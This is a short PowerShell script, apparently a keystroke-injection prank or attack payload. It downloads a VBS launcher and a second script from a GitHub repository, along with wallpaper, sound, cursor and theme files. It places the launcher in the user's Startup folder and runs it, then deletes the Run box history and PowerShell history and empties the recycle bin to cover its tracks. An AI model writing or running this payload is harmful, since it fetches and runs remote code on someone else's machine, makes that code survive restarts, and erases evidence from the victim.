#1
Set-Location $env:Temp
Invoke-WebRequest https://w.forfun.com/fetch/9f/9f6e10f93c578b57172b33a9b0545594.jpeg -O Anime.jpg
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/script.ps1 -O script.ps1
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Connection.wav -O Connection.wav
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Disconnection.wav -O Disconnection.wav
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/genshin.ico -O genshin.ico
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/xui2.cur -O xui2.cur
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/Anime.theme -O Anime.theme

#2
Set-Location $env:AppData\Microsoft\Windows\"Start Menu"\Programs\Startup
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/launcher.vbs -O launcher.vbs
.\launcher.vbs

#3
# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
